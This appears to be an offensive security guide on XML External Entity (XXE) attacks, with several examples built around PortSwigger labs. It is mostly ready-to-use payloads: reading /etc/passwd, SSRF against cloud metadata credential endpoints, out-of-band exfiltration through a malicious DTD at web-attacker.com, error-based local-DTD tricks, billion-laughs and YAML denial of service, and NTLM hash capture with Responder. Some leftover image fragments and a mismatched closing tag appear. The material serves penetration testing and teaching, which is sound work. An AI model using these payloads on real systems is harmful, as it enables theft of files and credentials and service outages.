# XXE - Basic Attacks and Exploitation

## XML Basics

XML is a markup language designed for data storage and transport, featuring a flexible structure that allows for the use of descriptively named tags. It differs from HTML by not being limited to a set of predefined tags. XML's significance has declined with the rise of JSON, despite its initial role in AJAX technology.

- **Data Representation through Entities**: Entities in XML enable the representation of data, including special characters like `&lt;` and `&gt;`, which correspond to `<` and `>` to avoid conflict with XML's tag system.
- **Defining XML Elements**: XML allows for the definition of element types, outlining how elements should be structured and what content they may contain, ranging from any type of content to specific child elements.
- **Document Type Definition (DTD)**: DTDs are crucial in XML for defining the document's structure and the types of data it can contain. They can be internal, external, or a combination, guiding how documents are formatted and validated.
- **Custom and External Entities**: XML supports the creation of custom entities within a DTD for flexible data representation. External entities, defined with a URL, raise security concerns, particularly in the context of XML External Entity (XXE) attacks, which exploit the way XML parsers handle external data sources: `<!DOCTYPE foo [ <!ENTITY myentity "value" > ]>`
- **XXE Detection with Parameter Entities**: For detecting XXE vulnerabilities, especially when conventional methods fail due to parser security measures, XML parameter entities can be utilized. These entities allow for out-of-band detection techniques, such as triggering DNS lookups or HTTP requests to a controlled domain, to confirm the vulnerability.
  - `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
  - `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`

## Main attacks

[**Most of these attacks were tested using the awesome Portswiggers XEE labs: https://portswigger.net/web-security/xxe**](https://portswigger.net/web-security/xxe)

### New Entity test

In this attack I'm going to test if a simple new ENTITY declaration is working

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
    <productId>&toreplace;</productId>
    <storeId>1</storeId>
</stockCheck>
```

.png>)

### Read file

Lets try to read `/etc/passwd` in different ways. For Windows you could try to read: `C:\windows\system32\drivers\etc\hosts`

In this first case notice that SYSTEM "_**file:///**etc/passwd_" will also work.

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```

.png>)

This second case should be useful to extract a file if the web server is using PHP (Not the case of Portswiggers labs)

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```

In this third case notice we are declaring the `Element stockCheck` as ANY

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
    <productId>&file;</productId>
    <storeId>1</storeId>
</stockCheck3>
```

.png>)

### Directory listing

In **Java** based applications it might be possible to **list the contents of a directory** via XXE with a payload like (just asking for the directory instead of the file):

```xml
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///"><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```

### SSRF

An XXE could be used to abuse a SSRF inside a cloud

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

### Blind SSRF

Using the **previously commented technique** you can make the server access a server you control to show it's vulnerable. But, if that's not working, maybe is because **XML entities aren't allowed**, in that case you could try using **XML parameter entities**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```

### "Blind" SSRF - Exfiltrate data out-of-band

**In this occasion we are going to make the server load a new DTD with a malicious payload that will send the content of a file via HTTP request (for multi-line files you could try to ex-filtrate it via \_ftp://**\_ using this basic server for example [**xxe-ftp-server.rb**](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb)**). This explanation is based in** [**Portswiggers lab here**](https://portswigger.net/web-security/xxe/blind)**.**

In the given malicious DTD, a series of steps are conducted to exfiltrate data:

### Malicious DTD Example:

The structure is as follows:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY % exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

The steps executed by this DTD include:

1. **Definition of Parameter Entities:**
   - An XML parameter entity, `%file`, is created, reading the content of the `/etc/hostname` file.
   - Another XML parameter entity, `%eval`, is defined. It dynamically declares a new XML parameter entity, `%exfiltrate`. The `%exfiltrate` entity is set to make an HTTP request to the attacker's server, passing the content of the `%file` entity within the query string of the URL.
2. **Execution of Entities:**
   - The `%eval` entity is utilized, leading to the execution of the dynamic declaration of the `%exfiltrate` entity.
   - The `%exfiltrate` entity is then used, triggering an HTTP request to the specified URL with the file's contents.

The attacker hosts this malicious DTD on a server under their control, typically at a URL like `http://web-attacker.com/malicious.dtd`.

**XXE Payload:** To exploit a vulnerable application, the attacker sends an XXE payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```

This payload defines an XML parameter entity `%xxe` and incorporates it within the DTD. When processed by an XML parser, this payload fetches the external DTD from the attacker's server. The parser then interprets the DTD inline, executing the steps outlined in the malicious DTD and leading to the exfiltration of the `/etc/hostname` file to the attacker's server.

### Error Based(External DTD)

**In this case we are going to make the server loads a malicious DTD that will show the content of a file inside an error message (this is only valid if you can see error messages).** [**Example from here.**](https://portswigger.net/web-security/xxe/blind)

An XML parsing error message, revealing the contents of the `/etc/passwd` file, can be triggered using a malicious external Document Type Definition (DTD). This is accomplished through the following steps:

1. An XML parameter entity named `file` is defined, which contains the contents of the `/etc/passwd` file.
2. An XML parameter entity named `eval` is defined, incorporating a dynamic declaration for another XML parameter entity named `error`. This `error` entity, when evaluated, attempts to load a nonexistent file, incorporating the contents of the `file` entity as its name.
3. The `eval` entity is invoked, leading to the dynamic declaration of the `error` entity.
4. Invocation of the `error` entity results in an attempt to load a nonexistent file, producing an error message that includes the contents of the `/etc/passwd` file as part of the file name.

The malicious external DTD can be invoked with the following XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```

Upon execution, the web server's response should include an error message displaying the contents of the `/etc/passwd` file.

.png>)

_**Please notice that external DTD allows us to include one entity inside the second `eval`), but it is prohibited in the internal DTD. Therefore, you can't force an error without using an external DTD (usually).**_

### **Error Based (system DTD)**

So what about blind XXE vulnerabilities when **out-of-band interactions are blocked** (external connections aren't available)?

A loophole in the XML language specification can **expose sensitive data through error messages when a document's DTD blends internal and external declarations**. This issue allows for the internal redefinition of entities declared externally, facilitating the execution of error-based XXE attacks. Such attacks exploit the redefinition of an XML parameter entity, originally declared in an external DTD, from within an internal DTD. When out-of-band connections are blocked by the server, attackers must rely on local DTD files to conduct the attack, aiming to induce a parsing error to reveal sensitive information.

Consider a scenario where the server's filesystem contains a DTD file at `/usr/local/app/schema.dtd`, defining an entity named `custom_entity`. An attacker can induce an XML parsing error revealing the contents of the `/etc/passwd` file by submitting a hybrid DTD as follows:

```xml
<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
    <!ENTITY % custom_entity '
        <!ENTITY % file SYSTEM "file:///etc/passwd">
        <!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file'>">
        %eval;
        %error;
    '>
    %local_dtd;
]>
```

The outlined steps are executed by this DTD:

- The definition of an XML parameter entity named `local_dtd` includes the external DTD file located on the server's filesystem.
- A redefinition occurs for the `custom_entity` XML parameter entity, originally defined in the external DTD, to encapsulate an [error-based XXE exploit](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages). This redefinition is designed to elicit a parsing error, exposing the contents of the `/etc/passwd` file.
- By employing the `local_dtd` entity, the external DTD is engaged, encompassing the newly defined `custom_entity`. This sequence of actions precipitates the emission of the error message aimed for by the exploit.

**Real world example:** Systems using the GNOME desktop environment often have a DTD at `/usr/share/yelp/dtd/docbookx.dtd` containing an entity called `ISOamso`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
        <!ENTITY % file SYSTEM "file:///etc/passwd">
        <!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>">
        %eval;
        %error;
    '>
    %local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```

.png>)

As this technique uses an **internal DTD you need to find a valid one first**. You could do this **installing** the same **OS / Software** the server is using and **searching some default DTDs**, or **grabbing a list** of **default DTDs** inside systems and **check** if any of them exists:

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

For more information check [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

### Finding DTDs inside the system

In the following awesome github repo you can find **paths of DTDs that can be present in the system**:

Moreover, if you have the **Docker image of the victim system**, you can use the tool of the same repo to **scan** the **image** and **find** the path of **DTDs** present inside the system. Read the [Readme of the github](https://github.com/GoSecure/dtd-finder) to learn how.

```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

 [=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

 [=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```

### XXE via Office Open XML Parsers

For a more in depth explanation of this attack, **check the second section of** [**this amazing post**](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) **from Detectify**.

The ability to **upload Microsoft Office documents is offered by many web applications**, which then proceed to extract certain details from these documents. For instance, a web application may allow users to import data by uploading an XLSX format spreadsheet. In order for the parser to extract the data from the spreadsheet, it will inevitably need to parse at least one XML file.

To test for this vulnerability, it is necessary to create a **Microsoft Office file containing an XXE payload**. The first step is to create an empty directory to which the document can be unzipped.

Once the document has been unzipped, the XML file located at `./unzipped/word/document.xml` should be opened and edited in a preferred text editor (such as vim). The XML should be modified to include the desired XXE payload, often starting with an HTTP request.

The modified XML lines should be inserted between the two root XML objects. It is important to replace the URL with a monitorable URL for requests.

Finally, the file can be zipped up to create the malicious poc.docx file. From the previously created "unzipped" directory, the following command should be run:

Now, the created file can be uploaded to the potentially vulnerable web application, and one can hope for a request to appear in the Burp Collaborator logs.

### Jar: protocol

The **jar** protocol is made accessible exclusively within **Java applications**. It is designed to enable file access within a **PKZIP** archive (e.g., `.zip`, `.jar`, etc.), catering to both local and remote files.

```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```

> [!CAUTION]
> To be able to access files inside PKZIP files is **super useful to abuse XXE via system DTD files.** Check [this section to learn how to abuse system DTD files](xxe-xee-xml-external-entity.md#error-based-system-dtd).

The process behind accessing a file within a PKZIP archive via the jar protocol involves several steps:

1. An HTTP request is made to download the zip archive from a specified location, such as `https://download.website.com/archive.zip`.
2. The HTTP response containing the archive is stored temporarily on the system, typically in a location like `/tmp/...`.
3. The archive is then extracted to access its contents.
4. The specific file within the archive, `file.zip`, is read.
5. After the operation, any temporary files created during this process are deleted.

An interesting technique to interrupt this process at the second step involves keeping the server connection open indefinitely when serving the archive file. Tools available at [this repository](https://github.com/GoSecure/xxe-workshop/tree/master/24_write_xxe/solution) can be utilized for this purpose, including a Python server (`slow_http_server.py`) and a Java server (`slowserver.jar`).

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```

> [!CAUTION]
> Writing files in a temporary directory can help to **escalate another vulnerability that involves a path traversal** (such as local file include, template injection, XSLT RCE, deserialization, etc).

### XSS

```xml
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```

### DoS

#### Billion Laugh Attack

```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

#### Yaml Attack

```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```

#### Quadratic Blowup Attack

.png>)

#### Getting NTML

On Windows hosts it is possible to get the NTML hash of the web server user by setting a responder.py handler:

```bash
Responder.py -I eth0 -v
```

and by sending the following request

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```

Then you can try to crack the hash using hashcat
